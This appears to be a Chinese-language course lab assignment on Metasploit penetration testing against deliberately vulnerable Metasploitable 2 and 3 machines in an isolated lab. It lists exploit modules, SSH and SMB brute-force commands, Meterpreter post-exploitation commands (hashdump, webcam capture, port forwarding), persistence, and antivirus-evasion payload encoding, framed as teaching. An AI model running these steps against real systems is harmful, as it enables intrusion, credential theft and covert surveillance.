# 项目 06：Metasploit 漏洞利用实战（Metasploitable 2 + 3）

> 对应章节：第 8 章《渗透测试方法论》

## 目标

1. 熟练 Metasploit Framework 的工作流：`db_nmap → search → use → set → exploit → post`。
2. 在 Metasploitable 2/3 上完成：
   - 远程代码执行（VSFTPd 2.3.4 后门、Unreal IRCd、Samba）
   - Windows 漏洞（EternalBlue / MS08-067）
   - 口令爆破（SSH、SMB）
   - 后渗透（Meterpreter 模块、提权、持久化）
3. 输出一份 PTES 风格的报告。

## 环境

```
攻击机   Kali Linux        192.168.56.10
靶机 A   Metasploitable 2  192.168.56.101
靶机 B   Metasploitable 3  192.168.56.102  (可选，Win 2008 R2)
```

> **仅限自己电脑里的虚拟网络**，严禁对公网扫描。

### 快速部署 Metasploitable 2

```bash
# 官方 OVA
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
# 导入 VirtualBox，设置 Host-Only 网络
```

### Metasploitable 3（Linux + Windows）

```bash
git clone https://github.com/rapid7/metasploitable3
cd metasploitable3
./build.sh ubuntu1404
./build.sh windows_2008
vagrant up
```

## 常用模块速查

```
search eternalblue
search type:exploit platform:unix
search cve:2017-0143
info exploit/windows/smb/ms17_010_eternalblue
show options
show payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## 必做任务

### A. 远程利用

1. **vsftpd 2.3.4 后门**：`exploit/unix/ftp/vsftpd_234_backdoor`
2. **UnrealIRCd**：`exploit/unix/irc/unreal_ircd_3281_backdoor`
3. **Samba UserMap**：`exploit/multi/samba/usermap_script`
4. **Java RMI**：`exploit/multi/misc/java_rmi_server`
5. **(M3 Windows)** EternalBlue：`exploit/windows/smb/ms17_010_eternalblue`

每个记录：使用的 payload、监听端口、获得的 Shell 类型。

### B. 口令爆破

```
# SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.56.101
set USER_FILE users.txt
set PASS_FILE pass.txt
run

# SMB
use auxiliary/scanner/smb/smb_login
```

### C. Meterpreter 后渗透

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > ps
meterpreter > migrate <pid>
meterpreter > screenshot
meterpreter > webcam_snap
meterpreter > run post/multi/manage/autoroute
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.50
```

### D. 提权

- Linux：`post/multi/recon/local_exploit_suggester`
- Windows：`post/multi/recon/local_exploit_suggester` + 手动检查 SeImpersonatePrivilege 等。

### E. 持久化（仅在靶场做）

```
run post/windows/manage/persistence_exe    # Windows 服务持久化（老版本）
run post/linux/manage/cron_persistence
```

完成后 **必须清理**：删除用户、服务、计划任务、webshell。

## 交付物

- `report.md`：PTES 结构
  1. 前期交互与目标
  2. 情报收集（nmap 结果）
  3. 漏洞分析
  4. 利用过程（每个漏洞 1 节：命令 + 截图 + 影响）
  5. 后渗透（提权 / 横向）
  6. 修复建议
- `sessions.log`：Metasploit workspace 导出
- `scripts/`：辅助脚本（端口扫描、hash 提取、rc file）

## 加分项

- 用 `resource` 文件把整个攻击流程脚本化：`msfconsole -q -r pwn.rc`。
- 在 Metasploitable 3 Windows 上演示 **Pass-the-Hash + SMB 横向移动** 到另一台 Windows 机器。
- 用 `msfvenom` 自定义 payload 绕过简单 AV（加 shikata_ga_nai、分段加载）。
- 对照 **ATT&CK**，把你用到的每个技术标上 Tid（如 T1190、T1003、T1055）。
